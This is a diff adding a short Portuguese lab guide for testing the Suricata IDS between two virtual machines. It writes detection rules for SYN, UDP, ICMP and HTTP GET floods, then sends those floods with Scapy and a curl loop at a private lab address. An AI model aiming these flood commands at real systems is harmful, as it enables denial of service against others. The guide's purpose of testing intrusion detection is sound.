@@ -1,0 +1,63 @@
+Setup with 2 different VMs, connected via network interface epns03
+
+
+ VM1 – Configuração do Suricata (IDS)
+📦 2.1 Instalar Suricata
+sudo apt update && sudo apt install -y suricata
+📁 2.2 Criar regras locais
+sudo nano /etc/suricata/rules/local.rules
+Adiciona as regras:
+alert tcp any any -> 10.0.0.10 80 (msg:"TCP SYN Flood Detected"; flags:S; flow:to_server; sid:1000001;)
+alert udp any any -> 10.0.0.10 80 (msg:"UDP Flood Detected"; flow:to_server; sid:1000002;)
+alert icmp any any -> 10.0.0.10 any (msg:"ICMP Ping Detected"; sid:1000003;)
+alert http any any -> 10.0.0.10 80 (msg:"HTTP GET Flood Detected"; content:"GET"; http_method; sid:1000004;)
+
+🧪 2.3 Verificar se as regras estão a ser lidas
+sudo suricata -T -c /etc/suricata/suricata.yaml -v
+
+Esperado: 4 rules successfully loaded
+🌐 2.4 Iniciar servidor HTTP (necessário para ataque GET)
+cd ~
+sudo python3 -m http.server 80
+🛡️ 2.5 Iniciar o Suricata
+Noutro terminal:
+sudo timeout 600s suricata -c /etc/suricata/suricata.yaml -i enp0s3
+sudo suricata -c /etc/suricata/suricata.yaml -i enp0s3
+👁️ 2.6 Monitorar alertas
+sudo tail -f /var/log/suricata/fast.log
+
+
+💣 3. VM2 – Enviar os ataques com Scapy e cURL
+🧰 3.1 Instalar Scapy
+sudo apt update && sudo apt install -y python3-pip curl
+pip3 install scapy
+
+🚀 3.2 Enviar os ataques:
+# Abrir Python
+sudo python3
+🔹 TCP SYN Flood
+from scapy.all import *
+send(IP(dst="10.0.0.10")/TCP(dport=80, flags="S"), count=200)
+
+🔹 UDP Flood
+send(IP(dst="10.0.0.10")/UDP(dport=80), count=200)
+
+🔹 ICMP Ping Flood
+send(IP(dst="10.0.0.10")/ICMP(), count=100)
+
+🔹 HTTP GET Flood
+1. Abre um terminal na VM1 (Suricata/Vítima)
+2. Executa o seguinte comando:
+sudo python3 -m http.server 80
+Depois na VM2 executar o seguinte comando:
+for i in {1..100}; do curl http://10.0.0.10 > /dev/null 2>&1 & done
+
+
+📊 4. Resultados
+Verifica os alertas no fast.log
+
+
+Exporta os alertas:
+cp /var/log/suricata/fast.log ~/suricata_alerts.txt
+VM2 
+sudo tcpdump -i enp0s3 port 80 and tcp
